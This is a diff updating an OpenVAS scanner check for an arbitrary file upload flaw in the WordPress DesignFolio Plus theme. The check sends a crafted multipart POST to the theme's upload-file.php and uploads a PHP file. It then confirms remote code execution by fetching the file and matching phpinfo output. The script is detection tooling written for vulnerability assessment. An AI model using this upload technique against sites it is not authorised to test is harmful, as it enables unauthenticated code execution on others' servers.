@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 6443 2017-06-27 10:00:22Z teissa $
+# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
 #
 # Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability
 #
@@ -29,14 +29,14 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805156");
-  script_version("$Revision: 6443 $");
+  script_version("$Revision: 11492 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-06-27 12:00:22 +0200 (Tue, 27 Jun 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-18 14:31:11 +0530 (Wed, 18 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability");
-  script_tag(name: "summary" , value:"The host is installed with Wordpress
+  script_tag(name:"summary", value:"The host is installed with Wordpress
   DesignFolio Plus Theme and is prone to arbitrary file upload vulnerability.");
 
   script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
@@ -46,21 +46,17 @@ if(description)
   restrict access to certain files.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow an
-  unauthenticated remote attacker to upload files in an affected site.
+  unauthenticated remote attacker to upload files in an affected site.");
 
-  Impact Level: Application");
-
-  script_tag(name: "affected" , value:"Wordpress DesignFolio Plus Theme
+  script_tag(name:"affected", value:"Wordpress DesignFolio Plus Theme
   version 1.2, Prior version may also be affected.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36372");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36372");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -74,19 +70,12 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-report = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
@@ -95,13 +84,14 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
 url = dir + '/wp-content/themes/designfolio-plus/admin/upload-file.php';
 wpReq = http_get(item: url,  port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);
+vtstring = get_vt_string( lowercase:TRUE );
+useragent = get_http_user_agent();
 
-## Confirm Plugin
 if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 {
   index = eregmatch(pattern:'Undefined index: ([0-9a-z]+) in', string:wpRes);
 
-  fileName = 'openvas_' + rand() + '.php';
+  fileName = vtstring + '_' + rand() + '.php';
 
   postData = string('------------7nLRJ4OOOKgWZky9bsIqMS\r\n',
                     'Content-Disposition: form-data; name="', index[1], '"; filename="', fileName, '"\r\n',
@@ -113,25 +103,21 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
                   "Host: ", get_host_name(), "\r\n",
-                  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+                  "User-Agent: ", useragent, "\r\n",
                   "Content-Length: ", strlen(postData), "\r\n",
                   "Content-Type: multipart/form-data; boundary=----------7nLRJ4OOOKgWZky9bsIqMS\r\n\r\n",
                   postData, "\r\n");
 
-  ## Send request and receive the response
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## Checking File has been created
   if('success' >< rcvRes && rcvRes =~ "HTTP/1.. 200 OK")
   {
     ## Uploaded file URL
     url = dir + "/" + fileName;
 
-    ## Confirm the Exploit and Deleting uploaded file
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:">phpinfo\(\)<", extra_check:">System"))
     {
-      ## Confirm Deletion
       if(http_vuln_check(port:http_port, url:url,
          check_header:FALSE, pattern:"HTTP/1.. 200 OK"))
       {
